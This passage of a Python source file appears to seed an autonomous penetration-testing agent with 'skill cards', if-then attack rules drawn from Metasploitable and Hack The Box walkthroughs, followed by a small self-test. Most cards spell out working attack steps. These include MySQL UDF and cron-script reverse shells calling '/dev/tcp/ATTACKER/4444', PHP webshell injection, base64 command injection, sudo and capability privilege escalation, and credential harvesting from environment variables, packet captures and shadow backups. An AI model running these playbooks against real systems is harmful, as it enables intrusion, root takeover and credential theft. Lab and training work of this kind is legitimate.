                if_condition="Multiple vulnerabilities discovered",
                then_action="Priority: backdoors(instant) → default creds(fast) → known CVE exploits(reliable) → web vulns(complex) → brute force(slow). WHY: Efficiency matters. The fastest path to root uses the least steps and has the highest probability of success.",
                confidence=0.93,
                evidence_refs=["phase_reasoning"],
            ),
            SkillCard(
                id="ms3_mysql_udf_chain",
                if_condition="MS3 target AND Port 3306 open AND MySQL",
                then_action="mysql -h {target} -u root -p'sploitme' → CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; → SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'). WHY: UDF (User-Defined Functions) allow executing system commands from MySQL. MS3's weak password 'sploitme' gives initial access.",
                confidence=0.87,
                evidence_refs=["ms3_credentials"],
            ),
            SkillCard(
                id="ms3_wordpress_to_shell_chain",
                if_condition="MS3 target AND Port 80 open AND WordPress detected",
                then_action="wpscan --enumerate ap → find vulnerable plugin → exploit OR login admin:admin → Appearance → Theme Editor → inject PHP reverse shell into 404.php. WHY: WordPress admin can edit theme files, injecting PHP code that executes on page load.",
                confidence=0.86,
                evidence_refs=["ms3_kill_chain_wordpress"],
            ),
            # ─── HTB Walkthrough-Derived Skills (Phase 7.0) ──────────
            # Extracted from 15 HTB walkthroughs by Claude analysis
            SkillCard(
                id="htb_idor_sequential_ids",
                if_condition="Web app uses sequential IDs in URL paths (e.g., /data/5, /user/3, /capture/1)",
                then_action="Test IDOR by changing ID to 0 or other low values. Download any files found (especially .pcap captures). WHY: Sequential IDs mean no authorization check — any user's data is accessible by changing the number. ID=0 often has admin/initial data. Source: Cap walkthrough.",
                confidence=0.95,
                evidence_refs=["htb_cap_walkthrough"],
            ),
            SkillCard(
                id="htb_pcap_cleartext_creds",
                if_condition="PCAP/network capture file obtained (from IDOR, file download, or share)",
                then_action="tshark -r file.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' OR open in Wireshark and filter for ftp/http/telnet. WHY: FTP/Telnet transmit credentials in cleartext. PCAP files are goldmines for credential harvesting. Source: Cap walkthrough.",
                confidence=0.94,
                evidence_refs=["htb_cap_walkthrough"],
            ),
            SkillCard(
                id="htb_linux_capabilities_privesc",
                if_condition="Linux user shell AND getcap shows cap_setuid on python3 or perl",
                then_action="python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' → instant root. WHY: cap_setuid allows the binary to change its UID. Python can call os.setuid(0) to become root, then spawn a root bash shell. Source: Cap walkthrough.",
                confidence=0.97,
                evidence_refs=["htb_cap_walkthrough", "CVE-none-capabilities"],
            ),
            SkillCard(
                id="htb_ssrf_filtered_ports",
                if_condition="Nmap shows filtered ports AND an SSRF-capable web app on an open port",
                then_action="Configure SSRF proxy (e.g., Request Baskets forward_url=http://127.0.0.1:FILTERED_PORT) to reach internal services through the target. WHY: Filtered ports are reachable from localhost. SSRF lets us proxy through the target to reach internal-only services. Source: Sau walkthrough (CVE-2023-27163).",
                confidence=0.93,
                evidence_refs=["htb_sau_walkthrough", "CVE-2023-27163"],
            ),
            SkillCard(
                id="htb_systemctl_pager_root",
                if_condition="sudo -l shows NOPASSWD for systemctl",
                then_action="sudo /usr/bin/systemctl status anything → when pager opens, type !sh → root shell. WHY: systemctl uses 'less' as its pager. In less, !command spawns a shell. Since systemctl runs as root via sudo, the spawned shell is root. Source: Sau walkthrough.",
                confidence=0.96,
                evidence_refs=["htb_sau_walkthrough", "gtfobins_systemctl"],
            ),
            SkillCard(
                id="htb_ftp_webroot_overlap",
                if_condition="FTP anonymous write enabled AND FTP root contains web server files (iisstart.htm, index.html)",
                then_action="Generate webshell (msfvenom ASPX for IIS, PHP for Apache) → upload via FTP → trigger via HTTP. WHY: FTP root = web root means anything uploaded via FTP is accessible via the web server. Upload code = instant RCE. Source: Devel walkthrough.",
                confidence=0.95,
                evidence_refs=["htb_devel_walkthrough"],
            ),
            SkillCard(
                id="htb_windows_kernel_privesc",
                if_condition="Windows shell obtained AND systeminfo shows old build (Win7 7600, Win2008, etc.)",
                then_action="Use windows-exploit-suggester or search for specific kernel exploit. Win7 Build 7600 = MS11-046 (afd.sys). Compile/download exploit, transfer via certutil, execute for SYSTEM. Source: Devel walkthrough.",
                confidence=0.92,
                evidence_refs=["htb_devel_walkthrough", "MS11-046"],
            ),
            SkillCard(
                id="htb_heartbleed_memory_leak",
                if_condition="Port 443 open AND OpenSSL version is 1.0.1-1.0.1f",
                then_action="nmap --script ssl-heartbleed -p 443 {target} → if vulnerable, run heartbleed exploit multiple times → search leaked memory for passwords, session tokens, base64 strings. WHY: Heartbleed leaks 64KB of server process memory per request. Multiple attempts leak different memory regions. Source: Valentine walkthrough.",
                confidence=0.94,
                evidence_refs=["htb_valentine_walkthrough", "CVE-2014-0160"],
            ),
            SkillCard(
                id="htb_tmux_session_hijack",
                if_condition="Linux user shell AND tmux/screen sessions running as root (found via find / -name '*tmux*' or tmux ls)",
                then_action="tmux -S /path/to/root/socket attach → instant root. WHY: Tmux sessions persist and can be attached to by anyone with access to the socket file. Root sessions = instant root. Source: Valentine walkthrough.",
                confidence=0.93,
                evidence_refs=["htb_valentine_walkthrough"],
            ),
            SkillCard(
                id="htb_cron_script_replacement",
                if_condition="Linux user shell AND writable script found in /scripts or /opt that runs as root cron",
                then_action="Replace script content with: import os; os.system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1') → wait for cron execution → root shell. WHY: Cron executes scripts at intervals. If the script is writable, replacing its content gives root on next execution. Source: Bashed walkthrough.",
                confidence=0.94,
                evidence_refs=["htb_bashed_walkthrough"],
            ),
            SkillCard(
                id="htb_webapp_config_cred_reuse",
                if_condition="Web application shell (www-data) obtained",
                then_action="cat config.php conf.php .env wp-config.php settings.py → extract DB credentials → try same password for SSH login. WHY: Developers reuse passwords across services. Web app DB password = SSH password is extremely common. Source: BoardLight, TwoMillion walkthroughs.",
                confidence=0.95,
                evidence_refs=["htb_boardlight_walkthrough", "htb_twomillion_walkthrough"],
            ),
            SkillCard(
                id="htb_subdomain_vhost_fuzzing",
                if_condition="Web server returns hostname redirect OR only SSH+HTTP ports open with nothing on main page",
                then_action="ffuf -u http://{target} -H 'Host: FUZZ.domain.htb' -w subdomains-top1million-5000.txt -fs DEFAULT → discover hidden applications on subdomains. WHY: Virtual hosting hides different apps on subdomains. The real attack surface is often on a subdomain, not the main domain. Source: BoardLight, Analytics walkthroughs.",
                confidence=0.94,
                evidence_refs=["htb_boardlight_walkthrough", "htb_analytics_walkthrough"],
            ),
            SkillCard(
                id="htb_env_var_cred_leak",
                if_condition="Shell inside a Docker container or application sandbox",
                then_action="env | grep -i 'pass\\|secret\\|key\\|token' → try leaked credentials for SSH to host. WHY: Containers receive secrets via environment variables. These often include host-level passwords. Source: Analytics walkthrough.",
                confidence=0.93,
                evidence_refs=["htb_analytics_walkthrough"],
            ),
            SkillCard(
                id="htb_overlayfs_kernel_privesc",
                if_condition="Ubuntu 22.04 OR kernel 5.15-6.2 AND user shell obtained",
                then_action="Run OverlayFS exploit (CVE-2023-2640/CVE-2023-32629): single-command unshare + overlay mount → root. WHY: Ubuntu 22.04 kernels have a specific OverlayFS bug allowing SUID bypass. Source: Analytics, TwoMillion walkthroughs.",
                confidence=0.92,
                evidence_refs=["htb_analytics_walkthrough", "htb_twomillion_walkthrough", "CVE-2023-2640"],
            ),
            SkillCard(
                id="htb_api_command_injection",
                if_condition="Web API endpoint that generates files or configs (VPN, reports, exports)",
                then_action="Test parameter values with ;id; to check for command injection. If confirmed, inject reverse shell via base64: ;echo BASE64_SHELL | base64 -d | bash;. WHY: File generation APIs often pass parameters to system commands. Source: TwoMillion walkthrough.",
                confidence=0.91,
                evidence_refs=["htb_twomillion_walkthrough"],
            ),
            SkillCard(
                id="htb_shadow_backup_crack",
                if_condition="Linux shell AND /backup/ directory exists OR find reveals shadow backup files",
                then_action="cat /backup/shadow.backup → john --wordlist=/usr/share/nmap/nselib/data/passwords.lst shadow_hashes → su with cracked password. WHY: Admins create shadow backups with weaker permissions. These contain crackable password hashes. Source: Sunday walkthrough.",
                confidence=0.92,
                evidence_refs=["htb_sunday_walkthrough"],
            ),
            SkillCard(
                id="htb_finger_enumeration",
                if_condition="Port 79 (finger) open",
                then_action="finger @{target} → enumerate users → finger username@{target} for details → hydra SSH brute force with discovered usernames. WHY: Finger reveals valid system usernames, eliminating half the brute force problem. Source: Sunday walkthrough.",
                confidence=0.90,
                evidence_refs=["htb_sunday_walkthrough"],
            ),
            SkillCard(
                id="htb_wget_sudo_privesc",
                if_condition="sudo -l shows NOPASSWD for wget",
                then_action="Use GTFOBins wget: sudo wget --use-askpass=/path/to/script http://attacker → root. WHY: wget's --use-askpass executes an arbitrary program to get proxy password, running it as root via sudo. Source: Sunday walkthrough.",
                confidence=0.91,
                evidence_refs=["htb_sunday_walkthrough", "gtfobins_wget"],
            ),
            SkillCard(
                id="htb_db_file_hash_extraction",
                if_condition="Application uses embedded database (Derby, H2, SQLite) AND user shell obtained",
                then_action="find /opt -name '*.dat' -o -name '*.db' → grep for hash patterns (SHA1, MD5, bcrypt) → extract and crack with hashcat/john. WHY: Embedded DBs store hashes in raw data files, not just SQL tables. grep through .dat files. Source: Bizness walkthrough.",
                confidence=0.89,
                evidence_refs=["htb_bizness_walkthrough"],
            ),
            SkillCard(
                id="htb_ad_gpp_decrypt",
                if_condition="Windows Active Directory target AND SMB Replication/SYSVOL share accessible",
                then_action="Find Groups.xml → extract cPassword → gpp-decrypt → get service account creds → Kerberoast with GetUserSPNs.py. WHY: Microsoft published the AES key for GPP encryption. ALL GPP passwords are trivially decryptable. Source: Active walkthrough.",
                confidence=0.94,
                evidence_refs=["htb_active_walkthrough"],
            ),
            SkillCard(
                id="htb_default_creds_before_brute",
                if_condition="CMS or admin panel login page found (Dolibarr, WordPress, OFBiz, Jenkins, etc.)",
                then_action="ALWAYS try default credentials FIRST: admin:admin, admin:password, root:root, tomcat:tomcat. WHY: Default credentials are instant access. Brute force is slow, noisy, and may trigger lockout. Source: BoardLight (admin:admin on Dolibarr), Bizness (OFBiz defaults).",
                confidence=0.96,
                evidence_refs=["htb_boardlight_walkthrough", "htb_bizness_walkthrough"],
            ),
            SkillCard(
                id="htb_js2py_sandbox_escape",
                if_condition="Flask web app using js2py to evaluate user JavaScript (check requirements.txt)",
                then_action="Use CVE-2024-28397 payload to escape js2py sandbox → navigate Python MRO → find subprocess.Popen → execute commands. WHY: js2py ≤0.74 allows JavaScript to access Python internals via __class__.__base__.__subclasses__(). Source: CodePartTwo walkthrough.",
                confidence=0.88,
                evidence_refs=["htb_codeparttwo_walkthrough", "CVE-2024-28397"],
            ),
            SkillCard(
                id="htb_sqlite_hash_dump",
                if_condition="Application shell AND SQLite database found (*.db, *.sqlite3 files)",
                then_action="sqlite3 database.db 'SELECT * FROM user' → extract password hashes → crack with CrackStation (MD5) or hashcat. WHY: Application databases contain user credentials. MD5 hashes crack instantly. Source: CodePartTwo walkthrough.",
                confidence=0.91,
                evidence_refs=["htb_codeparttwo_walkthrough"],
            ),
            SkillCard(
                id="htb_backup_tool_abuse",
                if_condition="sudo -l shows NOPASSWD for backup tool (npbackup-cli, restic, etc.) AND config file is modifiable",
                then_action="Copy config, modify backup paths to target /root, run sudo backup-tool -c modified_config -b → restore to read root files. WHY: Backup tools with sudo can read any directory when given a custom config. Source: CodePartTwo walkthrough.",
                confidence=0.88,
                evidence_refs=["htb_codeparttwo_walkthrough"],
            ),
            SkillCard(
                id="strategy_target_switching",
                if_condition="Current target fully compromised to CLOSEOUT",
                then_action="Switch targets: if on MS2 → consider MS3. Carry over learned strategies, adjust for new service landscape. WHY: Cross-target transfer learning is the hallmark of a skilled pentester — patterns transfer but details differ.",
                confidence=0.85,
                evidence_refs=["multi_target_strategy"],
            ),
        ]

        for skill in seeds:
            if self.promote(skill, reason="Phase 6.7: Pre-seeded from knowledge packs"):
                promoted += 1

        logger.info(f"Seeded {promoted} expert skill cards into library")
        return promoted


# Factory function
def create_skill_library(
    library_path: str = "core/memory/skill_library.json"
) -> SkillLibrary:
    """Create a skill library."""
    return SkillLibrary(library_path=library_path)


if __name__ == "__main__":
    from rich.console import Console
    console = Console()
    
    console.print("[bold cyan]Testing SkillLibrary[/bold cyan]")
    
    # Create library
    library = SkillLibrary(
        library_path="test_skill_library.json",
        audit_path="test_skill_audit.jsonl"
    )
    
    # Test promote
    skill1 = SkillCard(
        id="skill_test_001",
        if_condition="Port 22 is open",
        then_action="nmap -sV -p22 --script=ssh-* TARGET",
        confidence=0.85
    )
    
    skill2 = SkillCard(
        id="skill_test_002",
        if_condition="HTTP 80 detected",
        then_action="dirb http://TARGET",
        confidence=0.75
    )
    
    library.promote(skill1, reason="Test promotion")
    library.promote(skill2, reason="Test promotion")
    
    console.print(f"Skills in library: {len(library.get_all_skills())}")
    
    # Test stats
    stats = library.get_stats()
    console.print(f"Library stats: {stats}")
    
    # Test duplicate pruning
    duplicate = SkillCard(
        id="skill_test_003",
        if_condition="Port 22 is open",  # Same as skill1
        then_action="nmap -sV -p22 --script=ssh-* TARGET",
        confidence=0.70  # Lower confidence
    )
    library.promote(duplicate, reason="Testing duplicate")
    
    pruned = library.prune_duplicates()
    console.print(f"Pruned {pruned} duplicates")
    
    # Test get skills for condition
    matches = library.get_skills_for_condition(["port", "22"])
    console.print(f"Skills matching 'port 22': {len(matches)}")
    
    # Test audit log
    audit = library.get_audit_log()
    console.print(f"Audit log entries: {len(audit)}")
    
    # Cleanup
    import os
    os.remove("test_skill_library.json")
    os.remove("test_skill_audit.jsonl")
    
    console.print("\n[bold green]✓ SkillLibrary test passed![/bold green]")
